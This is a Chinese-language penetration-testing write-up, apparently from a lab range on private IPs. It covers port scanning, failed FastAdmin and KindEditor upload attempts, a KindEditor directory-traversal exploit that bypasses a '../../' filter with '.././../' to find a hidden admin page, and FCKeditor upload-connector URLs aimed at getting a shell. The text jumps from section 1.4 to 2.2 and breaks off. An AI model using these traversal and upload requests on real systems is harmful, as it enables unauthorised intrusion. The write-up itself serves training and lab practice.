第一层

1.1 外网信息收集
外网ip为192.168.106.130，nmap先安排一下全端口扫描
nmap -Pn -sV -p- 192.168.106.130
PORT     STATE SERVICE VERSION80/tcp   open  http    Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)7001/tcp open  http    Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)29034/tcp open  unknown


可以看到开放了四个端口
80端口有fastadmin
如果开启会员中心的话，在V1.0.0.20200506_beta版本有一个前台文件上传，尝试一下



1.2 fastadmin前台getshell（失败）
注册会员之后上传头像，有限制，说明是新版没这个洞


如果能找到后台地址的话，还是有机会能拿下的，上扫描，但是没扫到什么东西，可能用的是随机字符的路径


看看别的端口
7001端口的apache有东西，但是报403


对7001端口进行目录扫描


发现了kindeditor


访问

http://192.168.106.130:7001/kindeditor.js

得到版本号 3.5.5



1.3 kindeditor文件上传（失败）
kindeditor有一个文件上传漏洞，尝试一下
发现php目录下只有这些文件
http://192.168.106.130:7001/php/demo.phphttp://192.168.106.130:7001/php/file_manager_json.phphttp://192.168.106.130:7001/php/JSON.php


没法传shell
这个版本的kindeditor有目录遍历漏洞，
正好在file_manager_json.php里，尝试一下。
http://192.168.106.130:7001/php/file_manager_json.php



1.4 kindeditor目录遍历
直接访问../成功读取
http://192.168.106.130:7001/php/file_manager_json.php?path=../


尝试访问../../失败，被ban了
http://192.168.106.130:7001/php/file_manager_json.php?path=../../

猜测kindeditor把../../给ban掉了，于是用.././../来试试，成功绕过
http://192.168.106.130:7001/php/file_manager_json.php?path=.././../


访问fastadmin目录下的public目录即可看到后台路径
http://192.168.106.130:7001/php/file_manager_json.php?path=.././../fastadmin/public/

得到后台路径

http://192.168.106.130/FNeSOgYGkp.php

2.2 fckeditor文件上传getshell

访问

 http://10.0.0.222:18000/license.txt

发现fckeditor


根据目录拼接可得到以下几个上传目录
http://10.0.0.222:18000/editor/filemanager/connectors/test.htmlhttp://10.0.0.222:18000/editor/filemanager/connectors/uploadtest.htmlhttp://10.0.0.222:18000/editor/filemanager/browser/default/browser.html

http://10.0.0.222:18000/editor/filemanager/connectors/test.html
